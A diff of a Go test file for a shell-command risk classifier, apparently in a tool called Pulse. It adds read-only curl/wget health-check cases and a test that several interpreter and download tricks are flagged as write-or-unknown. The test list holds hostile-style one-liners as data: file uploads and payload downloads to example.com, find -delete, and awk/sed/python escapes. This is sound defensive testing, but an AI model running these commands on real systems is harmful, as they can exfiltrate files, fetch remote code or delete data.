@@ -92,8 +92,11 @@ func TestClassifyCommandRisk(t *testing.T) {
 		{"lspci", "lspci -v", CommandRiskReadOnly},
 		// Curl read-only variants
 		{"curl -k", "curl -k https://192.168.0.8:8007", CommandRiskReadOnly},
+		{"curl fail silent", "curl -fsS https://localhost:8080/health", CommandRiskReadOnly},
 		{"curl https", "curl https://localhost:8080/health", CommandRiskReadOnly},
 		{"curl http", "curl http://localhost:8080/api/status", CommandRiskReadOnly},
+		{"wget spider", "wget --spider https://localhost:8080/health", CommandRiskReadOnly},
+		{"wget quiet spider", "wget -q --spider https://localhost:8080/health", CommandRiskReadOnly},
 
 		// Network inspection commands
 		{"ip neigh", "ip neigh", CommandRiskReadOnly},
@@ -2052,6 +2055,38 @@ func TestExecutionIntent_BlocksDualUseInterpreterBypass(t *testing.T) {
 		`perl -e "open(my $fh, '>', '/tmp/flag')"`,
 		`bash -c "echo done"`,
 		`sh -c "echo done"`,
+	}
+
+	for _, cmd := range commands {
+		t.Run(cmd, func(t *testing.T) {
+			result := ClassifyExecutionIntent(cmd)
+			if result.Intent != IntentWriteOrUnknown {
+				t.Fatalf("ClassifyExecutionIntent(%q) = %v (reason: %s), want IntentWriteOrUnknown",
+					cmd, result.Intent, result.Reason)
+			}
+		})
+	}
+}
+
+func TestExecutionIntent_BlocksDualUseReadToolBypass(t *testing.T) {
+	commands := []string{
+		`timeout 5s python3 -c "open('/tmp/pulse-read-bypass','w').write('done')"`,
+		`env python3 -c "open('/tmp/pulse-read-bypass','w').write('done')"`,
+		`awk 'BEGIN { system("touch /tmp/pulse-read-bypass") }'`,
+		`cat /tmp/input | awk 'BEGIN { system("touch /tmp/pulse-read-bypass") }'`,
+		`sed 'w /tmp/pulse-read-bypass' /etc/hosts`,
+		`cat /etc/hosts | sed 'w /tmp/pulse-read-bypass'`,
+		`find /tmp -exec python3 -c "open('/tmp/pulse-read-bypass','w').write('done')" \;`,
+		`find /tmp -delete`,
+		`curl -s -o /tmp/pulse-read-bypass https://example.com/payload`,
+		`curl -sO https://example.com/payload`,
+		`curl -F file=@/tmp/pulse-read-bypass https://example.com/upload`,
+		`curl -T /tmp/pulse-read-bypass https://example.com/upload`,
+		`curl -XPOST https://example.com/hook`,
+		`curl -K /tmp/pulse-read-bypass.conf`,
+		`wget -q https://example.com/payload`,
+		`wget --spider -O /tmp/pulse-read-bypass https://example.com/payload`,
+		`wget --spider --post-data=payload https://example.com/hook`,
 	}
 
 	for _, cmd := range commands {
